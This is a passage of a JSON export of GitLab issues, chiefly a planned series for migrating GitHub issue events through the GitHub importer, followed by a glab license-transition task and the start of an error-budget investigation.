[{"id":103995078,"iid":354238,"project_id":278964,"title":"GitHub Importer - Migrate issue 'cross-referenced' events","description":"## Release Notes \n\nWe continue to improve the GitHub project importer by adding more metadata to the migrated projects. In this release we added cross-reference event history to issues, so any cross-reference mention of an issue will be logged in the event history, so the user will have the same event history as he had in GitHub. \n\n## Problem to solve\n\nWhen migrating projects from GitHub to GitLab, the issues are imported including any comments. However, any history/events are not migrated over. This means that, after the migration, the users would not be able to see who added/removed labels, milestones, assignees, etc. \n\nFor some users, this is a dealbreaker that would prevent them from migrating to GitLab.\n\n## Proposed solution\n\nDuring project import from GitHub, for each imported issue, check if any events of type `cross-referenced` exist for that issue and create corresponding events in GitLab.\n\n## Screenshots\n\nThese images illustrate the expected result in GitLab for each event in GitHub:\n\n| GitHub | ➡️ | GitLab |\n| ------ | - | ------ |\n| ![image](/uploads/75002fb7fcb781356dc8017c3bb8cadd/image.png) | ➡️ | ![image](/uploads/4cbc8f9661f3dd03f6a459052a693ead/image.png) | \n\n### :footprints: This issue\n\nThis issue is to migrate the following event: \n* `cross-referenced`\n  * This event is triggered when an issue is referenced (mentioned) from another issue or merge request.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#cross-referenced  \n\n### Iteration plan\n\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354234+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354235+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354236+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354238+ - **THIS ISSUE**\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354237+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354239+\n\n## Technical details\n\nPer [GitHub API documentation](https://docs.github.com/en/rest/reference/issues#list-issue-events):\n* we can use **`GET` /repos/{owner}/{repo}/issues/{issue_number}/events** to get a list of events for an issue\n\n## Documentation\n* [ ] :book: User doc: https://docs.gitlab.com/ee/user/project/import/github.html\n* [ ] :book: Developer doc: https://docs.gitlab.com/ee/development/github_importer.html","state":"closed","created_at":"2022-03-03T00:20:28.830Z","updated_at":"2022-10-06T10:21:19.045Z","closed_at":"2022-09-02T14:13:45.287Z","closed_by":{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"},"labels":["Category:Importers","Github","Importer:GitHub","Next Up","PM Ready","SoftServe::Import","backend","customer","devops::manage","estimation::completed","feature::enhancement","group::import","release post item::in review","section::dev","type::feature","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"},"user_notes_count":12,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354238","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354238","notes":"https://gitlab.com/api/v4/projects/278964/issues/354238/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354238/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354238","relative":"#354238","full":"gitlab-org/gitlab#354238"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7655,"epic":{"id":455021,"iid":7655,"title":"GitHub Importer - Migrate issue events","url":"/groups/gitlab-org/-/epics/7655","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103995020,"iid":354237,"project_id":278964,"title":"GitHub Importer - Migrate issue 'un/assigned' events","description":"## Problem to solve\n\nWhen migrating projects from GitHub to GitLab, the issues are imported including any comments. However, any history/events are not migrated over. This means that, after the migration, the users would not be able to see who added/removed labels, milestones, assignees, etc. \n\nFor some users, this is a dealbreaker that would prevent them from migrating to GitLab.\n\n## Proposed solution\n\nDuring project import from GitHub, for each imported issue, check if any events of type `assigned` or `unassigned` exist for that issue and create corresponding events in GitLab.\n\n## Screenshots\n\nThese images illustrate the expected result in GitLab for each event in GitHub:\n\n| GitHub | ➡️ | GitLab |\n| ------ | - | ------ |\n| ![image](/uploads/9131b4a63b2c8031978cacabb65e8b25/image.png) | ➡️ | ![image](/uploads/56f0655ded609df20e9032bcd37ae039/image.png) |\n| ![image](/uploads/8cdda125aa86118fa884cf424d70e01e/image.png) | ➡️ | ![image](/uploads/4e5ea2426f06a34fd1e98ba073ae5261/image.png) | \n\n### :footprints: This issue\n\nThis issue is to migrate the following events: \n* `assigned`\n  * This event is triggered when a user is assigned to an issue.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#assigned  \n* `unassigned` \n  * This event is triggered when a user is unassigned from an issue.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#unassigned  \n\n### Iteration plan\n\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354234+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354235+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354236+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354238+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354237+ - **THIS ISSUE**\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354239+\n\n## Technical details\n\nPer [GitHub API documentation](https://docs.github.com/en/rest/reference/issues#list-issue-events):\n* we can use **`GET` /repos/{owner}/{repo}/issues/{issue_number}/events** to get a list of events for an issue\n\n## Documentation\n* [x] :book: User doc: https://docs.gitlab.com/ee/user/project/import/github.html\n* [x] :book: Developer doc: https://docs.gitlab.com/ee/development/github_importer.html","state":"closed","created_at":"2022-03-03T00:17:59.554Z","updated_at":"2022-09-14T02:07:40.851Z","closed_at":"2022-09-12T15:38:50.978Z","closed_by":{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"},"labels":["Category:Importers","Github","Importer:GitHub","Next Up","PM Ready","SoftServe::Import","backend","customer","devops::manage","estimation::completed","feature::enhancement","group::import","section::dev","type::feature","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"},"user_notes_count":9,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354237","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354237","notes":"https://gitlab.com/api/v4/projects/278964/issues/354237/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354237/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354237","relative":"#354237","full":"gitlab-org/gitlab#354237"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7655,"epic":{"id":455021,"iid":7655,"title":"GitHub Importer - Migrate issue events","url":"/groups/gitlab-org/-/epics/7655","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103994941,"iid":354236,"project_id":278964,"title":"GitHub Importer - Migrate issue 'de/milestoned' events","description":"## Problem to solve\n\nWhen migrating projects from GitHub to GitLab, the issues are imported including any comments. However, any history/events are not migrated over. This means that, after the migration, the users would not be able to see who added/removed labels, milestones, assignees, etc. \n\nFor some users, this is a dealbreaker that would prevent them from migrating to GitLab.\n\n## Proposed solution\n\nDuring project import from GitHub, for each imported issue, check if any events of type `milestoned` or `demilestoned` exist for that issue and create corresponding events in GitLab.\n\n## Screenshots\n\nThese images illustrate the expected result in GitLab for each event in GitHub:\n\n| GitHub | ➡️ | GitLab |\n| ------ | - | ------ |\n| ![image](/uploads/7a4fd1224c2642c03c76d9734fc6f4c1/image.png) | ➡️ | ![image](/uploads/6c0a77c8c83dddd5422ec756c5303295/image.png) | \n| ![image](/uploads/9f014728049d7da7897d36df7a81c761/image.png) | ➡️ | ![image](/uploads/7e3de499be2197e2dc0a8efa7d2e0b55/image.png) | \n\n### :footprints: This issue\n\nThis issue is to migrate the following events: \n* `milestoned`\n  * This event is triggered when a milestone is assigned to an issue.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#milestoned  \n* `demilestoned` \n  * This event is triggered when a milestone is unassigned from an issue.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#demilestoned  \n\n### Iteration plan\n\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354234+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354235+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354236+ - **THIS ISSUE**\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354238+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354237+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354239+\n\n## Technical details\n\nPer [GitHub API documentation](https://docs.github.com/en/rest/reference/issues#list-issue-events):\n* we can use **`GET` /repos/{owner}/{repo}/issues/{issue_number}/events** to get a list of events for an issue\n\n## Documentation\n* [x] :book: User doc: https://docs.gitlab.com/ee/user/project/import/github.html\n* [x] :book: Developer doc: https://docs.gitlab.com/ee/development/github_importer.html","state":"closed","created_at":"2022-03-03T00:13:32.361Z","updated_at":"2022-09-12T12:46:21.335Z","closed_at":"2022-07-20T12:07:19.466Z","closed_by":{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"},"labels":["Category:Importers","Github","Importer:GitHub","Next Up","PM Ready","SoftServe::Import","backend","customer","devops::manage","estimation::completed","feature::enhancement","group::import","section::dev","type::feature","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"},"user_notes_count":3,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354236","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354236","notes":"https://gitlab.com/api/v4/projects/278964/issues/354236/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354236/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354236","relative":"#354236","full":"gitlab-org/gitlab#354236"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7655,"epic":{"id":455021,"iid":7655,"title":"GitHub Importer - Migrate issue events","url":"/groups/gitlab-org/-/epics/7655","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103994852,"iid":354235,"project_id":278964,"title":"GitHub Importer - Migrate issue 'un/labeled' events","description":"## Problem to solve\n\nWhen migrating projects from GitHub to GitLab, the issues are imported including any comments. However, any history/events are not migrated over. This means that, after the migration, the users would not be able to see who added/removed labels, milestones, assignees, etc. \n\nFor some users this is a dealbreaker that would prevent them from migrating to GitLab.\n\n## Proposed solution\n\nDuring project import from GitHub, for each imported issue, check if any events of type `labeled` or `unlabeled` exist for that issue and create corresponding events in GitLab.\n\n## Screenshots\n\nThese images illustrate the expected result in GitLab for each event in GitHub:\n\n| GitHub | ➡️ | GitLab |\n| ------ | - | ------ |\n| ![image](/uploads/86ba9e729dc5d2f4d8c4621f356df4fb/image.png) | ➡️ | ![image](/uploads/37fe63f382aa0b7358c660adc376d7f8/image.png) | \n| ![image](/uploads/55f13a1e184cebbaae2e7b86f253b179/image.png) | ➡️ | ![image](/uploads/47b57ed72a404679c9bd6ade655ab52c/image.png) | \n\n### :footprints: This issue\n\nThis issue is to migrate the following events: \n* `labeled`\n  * This event is triggered when a label is assigned to an issue.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#labeled  \n* `unlabeled` \n  * This event is triggered when a label is unassigned from an issue.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#unlabeled  \n\n### Iteration plan\n\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354234+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354235+ - **THIS ISSUE**\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354236+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354238+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354237+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354239+\n\n## Technical details\n\nPer [GitHub API documentation](https://docs.github.com/en/rest/reference/issues#list-issue-events):\n* we can use **`GET` /repos/{owner}/{repo}/issues/{issue_number}/events** to get a list of events for an issue\n\n## Documentation\n* [ ] :book: User doc: https://docs.gitlab.com/ee/user/project/import/github.html\n* [ ] :book: Developer doc: https://docs.gitlab.com/ee/development/github_importer.html","state":"closed","created_at":"2022-03-03T00:09:13.477Z","updated_at":"2022-09-02T14:17:02.456Z","closed_at":"2022-07-08T12:43:46.894Z","closed_by":{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"},"labels":["Category:Importers","Github","Importer:GitHub","Next Up","PM Ready","SoftServe::Import","backend","customer","devops::manage","estimation::completed","feature::enhancement","group::import","section::dev","type::feature","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":11311967,"username":"cervols-ext","name":"Tetiana Zavediuk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11311967/avatar.png","web_url":"https://gitlab.com/cervols-ext"},"user_notes_count":4,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354235","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354235","notes":"https://gitlab.com/api/v4/projects/278964/issues/354235/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354235/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354235","relative":"#354235","full":"gitlab-org/gitlab#354235"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7655,"epic":{"id":455021,"iid":7655,"title":"GitHub Importer - Migrate issue events","url":"/groups/gitlab-org/-/epics/7655","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103994437,"iid":354234,"project_id":278964,"title":"GitHub Importer - Migrate issue 'closed/reopened' events","description":"## Release Notes\n\nWe continue to improve the GitHub project importer and add more meta data to it. In this milestone we added events history of closing and reopening issues, so related events in GitHub issues will be migrated to GitLab issues. \n\n\n## Problem to solve\n\nWhen migrating projects from GitHub to GitLab, the issues are imported including any comments. However, any history/events are not migrated over. This means that, after the migration, the users would not be able to see who added/removed labels, milestones, assignees, etc. \n\nFor some users this is a dealbreaker that would prevent them from migrating to GitLab.\n\n## Proposed solution\n\nDuring project import from GitHub, for each imported issue, check if any events of type `closed` or `reopened` exist for that issue and create corresponding events in GitLab.\n\n## Screenshots\n\nThese images illustrate the expected result in GitLab for each event in GitHub:\n\n| GitHub | ➡️ | GitLab |\n| ------ | - | ------ |\n| ![image](/uploads/720f31d47ab7d2685e04d12b492f2d45/image.png) | ➡️ | ![image](/uploads/ccd34b265db9ac174e73b94fceae89f3/image.png) | \n| ![image](/uploads/3ad1c4fcb0afa277c7dddff5c6d60fa3/image.png) | ➡️ | ![image](/uploads/745cb16d4baf8eb33f2563277b9f816e/image.png) |\n\n### :footprints: This issue\n\nThis issue is to migrate the following events: \n* `closed`\n  * This event is triggered when an issue is closed.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#closed  \n* `reopened` \n  * This event is triggered when an issue is reopened.\n  * GitHub API doc: https://docs.github.com/en/developers/webhooks-and-events/events/issue-event-types#reopened  \n\n### Iteration plan\n\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354234+ - **THIS ISSUE**\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354235+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354236+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354238+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354237+\n1.  :footprints:  https://gitlab.com/gitlab-org/gitlab/-/issues/354239+\n\n## Technical details\n\nPer [GitHub API documentation](https://docs.github.com/en/rest/reference/issues#list-issue-events):\n* we can use **`GET` /repos/{owner}/{repo}/issues/{issue_number}/events** to get a list of events for an issue\n\n## Documentation\n* [ ] :book: User doc: https://docs.gitlab.com/ee/user/project/import/github.html\n* [ ] :book: Developer doc: https://docs.gitlab.com/ee/development/github_importer.html","state":"closed","created_at":"2022-03-02T23:51:24.342Z","updated_at":"2022-09-23T09:17:18.316Z","closed_at":"2022-09-02T13:14:03.246Z","closed_by":{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"},"labels":["Category:Importers","Github","Importer:GitHub","Next Up","PM Ready","SoftServe::Import","backend","customer","devops::manage","estimation::completed","feature::enhancement","group::import","missed:15.1","release post item::in review","section::dev","type::feature","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":2277639,"username":"knockfog-ext","name":"Rostyslav Safonov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2277639/avatar.png","web_url":"https://gitlab.com/knockfog-ext"},"user_notes_count":27,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354234","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354234","notes":"https://gitlab.com/api/v4/projects/278964/issues/354234/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354234/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354234","relative":"#354234","full":"gitlab-org/gitlab#354234"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7655,"epic":{"id":455021,"iid":7655,"title":"GitHub Importer - Migrate issue events","url":"/groups/gitlab-org/-/epics/7655","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103992263,"iid":354231,"project_id":278964,"title":"Copyright/License transition for `glab`","description":"As part of https://gitlab.com/groups/gitlab-org/-/epics/7514 and transitioning `glab` to GitLab the following steps need to be completed:\n\n - [ ] Clement to submit MR in GitLab to change Copyright to `GitLab`\n - [ ] Clement to email `gitlab-cli@gitlab.com` confirming transition of license and any applicable trademark assets\n\n### Additional Notes/Considerations\n\nThis is largely a house keeping effort to make it \"official\" that the project belongs to GitLab.","state":"closed","created_at":"2022-03-02T23:08:23.563Z","updated_at":"2022-10-28T15:43:39.133Z","closed_at":"2022-03-21T21:06:29.954Z","closed_by":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"labels":["Deliverable","auto updated","backend","cli","devops::create","group::code review","section::dev","type::feature","workflow::ready for development"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},{"id":5568402,"username":"profclems","name":"Clement Sam","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5568402/avatar.png","web_url":"https://gitlab.com/profclems"}],"author":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":2,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354231","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354231","notes":"https://gitlab.com/api/v4/projects/278964/issues/354231/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354231/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354231","relative":"#354231","full":"gitlab-org/gitlab#354231"},"severity":"UNKNOWN","moved_to_id":105235466,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103990667,"iid":354222,"project_id":278964,"title":"Investigate Code Review Error Budget","description":"The error budget for the code review team is now out of the acceptable threshold. We should investigate and see why that is and if there are some endpoints that we may need to look into more closely.\n\n![Screen_Shot_2022-03-02_at_3.56.11_PM](/uploads/807579ebf1e1a6a0348ab66e257b28b7/Screen_Shot_2022-03-02_at_3.56.11_PM.png)\n\n## Error Budget\n\nThe threshold is currently 20 minutes per 28 days where endpoints are not meeting the expected thresholds. \n\nMost of our \"overage\" failures are currently coming from rails requests, both web and API. Specifically endpoints that are taking more than the allowed time (apdex). See [this dashboard panel](https://dashboards.gitlab.net/d/stage-groups-code_review/stage-groups-code-review-group-dashboard?orgId=1\u0026viewPanel=11) for more details.\n\nDashboards:\n\n- Main Dashboard: https://dashboards.gitlab.net/d/stage-groups-code_review/stage-groups-code-review-group-dashboard?orgId=1\n- Error Budget Detail: https://dashboards.gitlab.net/d/stage-groups-detail-code_review/stage-groups-code-review-group-error-budget-detail?orgId=1\n- Opt-In Dashboard: https://dashboards.gitlab.net/d/general-request-apdex-sli-adoption/general-request-apdex-participation?orgId=1\n\nSisense Dashboard with historic data: https://app.periscopedata.com/app/gitlab/892274/Error-Budget-Dashboard---Stage-Create\n\n## History\n\nIn https://gitlab.com/groups/gitlab-org/-/epics/7125 we reviewed the current list of endpoints and identified which ones should be classified as \"high\", \"default\", or \"low.\" \n\nWe updated those endpoints to indicate programmatically which category they fell into:\n\n- https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76294\n- https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76306\n- https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76075\n\nThen we changed the reporting to opt-in to the custom metrics: 